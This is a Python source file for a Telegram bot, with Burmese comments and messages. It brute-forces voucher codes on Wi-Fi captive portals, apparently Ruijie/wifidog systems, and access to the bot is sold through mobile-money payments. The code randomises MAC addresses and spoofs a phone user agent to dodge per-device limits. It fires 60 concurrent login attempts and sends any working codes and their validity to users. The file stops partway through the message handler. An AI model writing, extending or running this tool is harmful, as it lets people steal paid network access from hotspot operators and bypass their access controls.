# ==============================================================================
# PART 1: CONFIGURATION, STORAGE & SESSION MANAGEMENT (UPGRADED)
# ==============================================================================
import os
import re
import sys
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta

import aiohttp
from aiohttp import web
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Logging စနစ်အား အမှားရှာဖွေရ လွယ်ကူစေရန် သတ်မှတ်ခြင်း
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# CONFIGURATION (လုံခြုံရေးအရ ENV ကိုသာ အဓိက အားကိုးရန် ပြင်ဆင်ထားသည်)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
GITHUB_REPO = os.environ.get("GITHUB_REPO", "https://github.com")

ENV_ADMIN_ID = os.environ.get("ADMIN_ID", "0000000000")
try:
    admin_id = int(ENV_ADMIN_ID)
except ValueError:
    admin_id = None

# ==================== MEMORY STORAGE ====================
authorized_users = {} 
user_sessions = {}    
user_states = {}      

global_url_history = {}

# ==================== PER-USER SESSION ====================
class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.portal_url = ""
        self.base_url = "http://192.168.110.1:2060"
        self.session_id = ""
        self.is_running = False
        self.stop_flag = False
        self.attempts = 0
        self.found_vouchers = [] 
        self.current_mode = "all"
        self.current_length = 6
        self.start_time = None
        self.in_running = set()
        self.concurrency_limit = 60  # CPU Overload ကာကွယ်ရန် ထိန်းညှိမှု
        self.status_message_id = None

    def get_history_set(self):
        if not self.portal_url:
            return set()
        url_key = self.portal_url.split('?') if '?' in self.portal_url else self.portal_url
        if url_key not in global_url_history:
            global_url_history[url_key] = set()
        return global_url_history[url_key]

def get_user_session(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]
# ==============================================================================
# PART 2: HELPER FUNCTIONS & NETWORK UTILITIES
# ==============================================================================

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r"mac=[^&]*", f"mac={new_mac}", url)
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}mac={new_mac}"

def escape_markdown(text):
    """ Telegram MarkdownV2 အတွက် အထူးသင်္ကေတများအား အမှားကင်းအောင် ပြုပြင်ခြင်း """
    if not text:
        return ""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return "".join(f"\\{c}" if c in escape_chars else c for c in str(text))

def generate_random_voucher(mode, length, history_set, in_running):
    """ ဂျင်နရေတာလုပ်ဆောင်ချက်အား စံပုံစံအတိုင်း ထည့်သွင်းထားခြင်း """
    if mode == "digit":
        chars = string.digits
    elif mode == "lower":
        chars = string.ascii_lowercase
    elif mode == "upper":
        chars = string.ascii_uppercase
    else:
        chars = string.ascii_letters + string.digits
        
    while True:
        code = "".join(random.choice(chars) for _ in range(length))
        if code not in history_set and code not in in_running:
            return code

async def get_session_id(http_session, session_url, previous_session_id):
    if not session_url:
        return previous_session_id
        
    url_match = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", session_url)
    if url_match:
        return url_match.group(1).strip()

    mac = get_mac()
    test_url = replace_mac(session_url, new_mac=mac)
    redmi_ua = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5X Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "User-Agent": redmi_ua,
    }
    try:
        async with http_session.get(test_url, headers=headers, allow_redirects=True, timeout=3.0) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", response)
            if session_id:
                return session_id.group(1)
            
            html = await req.text()
            sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', html)
            if sid_match:
                return sid_match.group(1)
    except Exception as e:
        logger.error(f"Session ID Processing Error: {e}")
        
    if "ruijienetworks.com" in session_url:
        return "cloud_session_active"
    return previous_session_id
# ==============================================================================
# PART 3: LOGIN WORKER CORE LOGIC
# ==============================================================================

async def login_voucher_async(http_session, session_id, voucher, base_url, portal_url):
    redmi_ua = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5X Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"

    if "ruijienetworks.com" in base_url:
        if "wifidog" in portal_url:
            login_url = portal_url.replace("stage=portal", "stage=login")
            if "voucher=" in login_url:
                login_url = re.sub(r'voucher=[^&]+', f'voucher={voucher}', login_url)
            else:
                separator = "&" if "?" in login_url else "?"
                login_url += f"{separator}voucher={voucher}"
        else:
            login_url = f"{base_url}/api/auth/wifidog?stage=login&voucher={voucher}"
            
        mac = get_mac()
        login_url = replace_mac(login_url, new_mac=mac)
        headers = {
            "User-Agent": redmi_ua, 
            "Referer": portal_url,
            "Accept": "*/*"
        }
        
        try:
            async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=3.0) as req:
                html = await req.text()
                success = ("success" in html.lower() or req.status in [301, 302])
                return voucher, success, html
        except Exception as e:
            logger.debug(f"Ruijie Request Error: {e}")
            return voucher, False, ""
            
    else:
        if not session_id:
            return voucher, False, ""
        url = f"{base_url}/api/auth/voucher/"
        data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": redmi_ua,
            "Origin": base_url,
            "X-Requested-With": "com.android.browser"
        }
        try:
            async with http_session.post(url, json=data, headers=headers, ssl=False, timeout=3.0) as req:
                res_text = await req.text()
                success = ("logonUrl" in res_text or '"result":true' in res_text or '"code":0' in res_text)
                return voucher, success, res_text
        except Exception as e:
            logger.debug(f"Standard Portal Request Error: {e}")
            return voucher, False, ""

def parse_validity(response_text):
    for pattern in [r'"remainTime"\s*:\s*"?(\d+)"?', r'"validTime"\s*:\s*"?(\d+)"?']:
        match = re.search(pattern, response_text)
        if match:
            try:
                seconds = int(match.group(1))
                if seconds == 0: return "Unlimited (အကန့်အသတ်မရှိ)"
                return f"{seconds // 3600} နာရီ {(seconds % 3600) // 60} မိနစ်"
            except ValueError:
                continue
    return "အကန့်အသတ်မရှိ"
# ==================== PART 4: MAIN WORKER ENGINE ====================
async def worker(queue, http_session, us, history_set, bot, chat_id, user_id):
    while not us.stop_flag:
        try:
            voucher = await queue.get()
        except:
            break
        if voucher is None:
            queue.task_done()
            break
        try:
            voucher, success, response_text = await login_voucher_async(
                http_session, us.session_id, voucher, us.base_url, us.portal_url
            )
            us.attempts += 1
            history_set.add(voucher)
            if success:
                validity = parse_validity(response_text)
                us.found_vouchers.append({"code": voucher, "time": datetime.now().strftime("%d-%m-%Y %H:%M:%S"), "validity": validity})
                if not is_admin(user_id) and user_id in authorized_users:
                    authorized_users[user_id]["found_today"] += 1
                await bot.send_message(
                    chat_id=chat_id,
                    text=f"🎉 *SUCCESS VOUCHER CODE တွေ့ရှိပါပြီ\!* 🎉\n\n🔑 *Code:* `{escape_markdown(voucher)}`\n⏱ *သက်တမ်း:* {escape_markdown(validity)}",
                    parse_mode="MarkdownV2"
                )
        except Exception as e:
            logger.error(f"Worker Error: {e}")
        finally:
            us.in_running.discard(voucher)
            queue.task_done()

async def high_speed_bruteforce(bot, chat_id, user_id):
    us = get_user_session(user_id)
    us.is_running, us.stop_flag, us.attempts, us.start_time = True, False, 0, datetime.now()
    history_set = us.get_history_set()
    status_msg = await bot.send_message(chat_id=chat_id, text="⚡ *Turbo Engine ကို စတင်နှိုးနေပါပြီ\.\.\.*", parse_mode="MarkdownV2")
    us.status_message_id = status_msg.message_id
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=us.concurrency_limit)) as http_session:
        us.session_id = await get_session_id(http_session, us.portal_url, us.session_id)
        if not us.session_id:
            await bot.edit_message_text(chat_id=chat_id, message_id=us.status_message_id, text="❌ *Portal Link မှ Session ID ရယူ၍ မရနိုင်ပါ။*")
            us.is_running = False
            return
        await bot.send_message(chat_id=chat_id, text=f"🔗 *Connected\! Session ID:* `{escape_markdown(us.session_id)}`", parse_mode="MarkdownV2")
        queue = asyncio.Queue(maxsize=us.concurrency_limit * 2)
        workers = [asyncio.create_task(worker(queue, http_session, us, history_set, bot, chat_id, user_id)) for _ in range(us.concurrency_limit)]
        last_ui_update = time.time()
        try:
            while not us.stop_flag:
                if not is_admin(user_id) and get_remaining_daily(user_id) <= 0: break
                if queue.qsize() < us.concurrency_limit:
                    while queue.qsize() < us.concurrency_limit * 1.5 and not us.stop_flag:
                        v_code = generate_random_voucher(us.current_mode, us.current_length, history_set, us.in_running)
                        us.in_running.add(v_code)
                        await queue.put(v_code)
                else:
                    await asyncio.sleep(0.1)
                now = time.time()
                if now - last_ui_update >= 4:
                    elapsed = (datetime.now() - us.start_time).total_seconds()
                    speed = us.attempts / elapsed if elapsed > 0 else 0
                    try:
                        await bot.edit_message_text(
                            chat_id=chat_id, message_id=us.status_message_id,
                            text=f"⚡ *Turbo Mode ရှာဖွေနေပါသည်\.\.\.*\n\n📊 *ရှာပြီး:* {us.attempts} ကြိမ်\n⚡ *အမြန်နှုန်း:* {speed:.1f} req/sec\n🏆 *တွေ့ရှိမှု:* {len(us.found_vouchers)} ခု",
                            parse_mode="MarkdownV2"
                        )
                    except: pass
                    last_ui_update = now
                await asyncio.sleep(0.01)
        finally:
            us.stop_flag = True
            for _ in range(us.concurrency_limit):
                try: queue.put_nowait(None)
                except: break
            await asyncio.gather(*workers, return_exceptions=True)
    us.is_running = False
# ==================== PART 5: ACCESS CONTROLS & KEYBOARDS ====================
def is_admin(user_id):
    return user_id == 6658845504 or (admin_id is not None and user_id == admin_id)

def is_authorized(user_id):
    if is_admin(user_id): return True
    if user_id in authorized_users:
        info = authorized_users[user_id]
        if datetime.now() < info["expires"]:
            if info["last_reset"] != datetime.now().date():
                info["found_today"], info["last_reset"] = 0, datetime.now().date()
            return True
        else: authorized_users.pop(user_id, None)
    return False

def get_remaining_daily(user_id):
    return 999999 if is_admin(user_id) else (max(0, authorized_users[user_id]["daily_limit"] - authorized_users[user_id]["found_today"]) if user_id in authorized_users else 0)

def admin_menu():
    return ReplyKeyboardMarkup([["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"], ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"], ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"], ["👥 User ခွင့်ပြုချက် ပေးရန်", "🗑️ User ခွင့်ပြုချက် ပြန်ဖျက်ရန်"]], resize_keyboard=True)

def user_menu():
    return ReplyKeyboardMarkup([["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"], ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"], ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"]], resize_keyboard=True)

def unauthorized_menu():
    return ReplyKeyboardMarkup([["🔑 Access Key ဝယ်ယူရန်", "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်"]], resize_keyboard=True)

# ==================== PART 6: MESSAGE HANDLERS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_admin(uid): await update.message.reply_text("👑 *Admin Panel*", reply_markup=admin_menu(), parse_mode="MarkdownV2")
    elif is_authorized(uid): await update.message.reply_text("✅ *အသုံးပြုခွင့် ရှိပါသည်*", reply_markup=user_menu(), parse_mode="MarkdownV2")
    else: await update.message.reply_text(f"👋 *မင်္ဂလာပါ\!*\n🆔 Your ID: `{uid}`", reply_markup=unauthorized_menu(), parse_mode="MarkdownV2")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if user_states.get(update.effective_user.id) == "waiting_receipt":
        user_states.pop(update.effective_user.id, None)
        await update.message.reply_text("📥 *ငွေလွှဲပြေစာအား လက်ခံရရှိပါပြီ။*", parse_mode="MarkdownV2")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid, text, state = update.effective_user.id, update.message.text, user_states.get(update.effective_user.id)
    if not is_authorized(uid) and not is_admin(uid):
        if text == "🔑 Access Key ဝယ်ယူရန်": await update.message.reply_text("📱 KBZPay / Wave Money ဖြင့် ဝယ်ယူနိုင်ပါသည်။")
        elif text == "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်": user_states[uid] = "waiting_receipt"; await update.message.reply_text("📸 ပြေစာပို့ပေးပါ။")
        return
    if is_admin(uid) and state == "waiting_approve":
        user_states.pop(uid, None)
        try:
            p = text.strip().split("|")
            authorized_users[int(p[0])] = {"expires": datetime.now() + timedelta(hours=int(p[1])), "daily_limit": int(p[2]), "found_today": 0, "last_reset": datetime.now().date()}
            await update.message.reply_text("✅ ခွင့်ပြုလိုက်ပါပြီ။")
        except: await update.message.reply_text("❌ ပုံစံမှားနေပါသည်။")
        return
    if text == "🌐 Portal Link ထည့်သွင်းရန်": user_states[uid] = "waiting_portal_link"; await update.message.reply_text("🔗 Link ပို့ပေးပါ။"); return
    if state == "waiting_portal_link":
        user_states.pop(uid, None); us = get_user_session(uid); us.portal_url = text.strip()
        m = re.search(r'(https?://[^/]+)', us.portal_url)
        us.base_url = m.group(1) if m else "https://ruijienetworks.com"
        if "ruijienetworks.com" not in us.base_url and ":" not in us.base_url.replace("http://","").replace("https://",""): us.base_url = f"{us.base_url}:2060"
        await update.message.reply_text("✅ Link မှတ်သားပြီးပါပြီ။", reply_markup=admin_menu() if is_admin(uid) else user_menu())
        return
    if text == "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်":
        us = get_user_session(uid)
        if not us.portal_url: await update.message.reply_text("⚠️ Link အရင်ထည့်ပါ။"); return
        if us.is_running: await update.message.reply_text("⚠️ အလုပ်လုပ်နေဆဲဖြစ်သည်။"); return
        await update.message.reply_text("⚙️ *ရွေးချယ်ပါ \-*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔢 Digit", callback_data="mode_digit")], [InlineKeyboardButton("🔣 All Mix", callback_data="mode_all")]]), parse_mode="MarkdownV2")
    elif text == "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်":
        us = get_user_session(uid)
        if us.is_running: us.stop_flag = True; await update.message.reply_text("⏳ ရပ်တန့်နေပါသည်\.\.\.")
        else: await update.message.reply_text("❌ မည်သည့်ရှာဖွေမှုမှ ပြုလုပ်မနေပါ။")
  
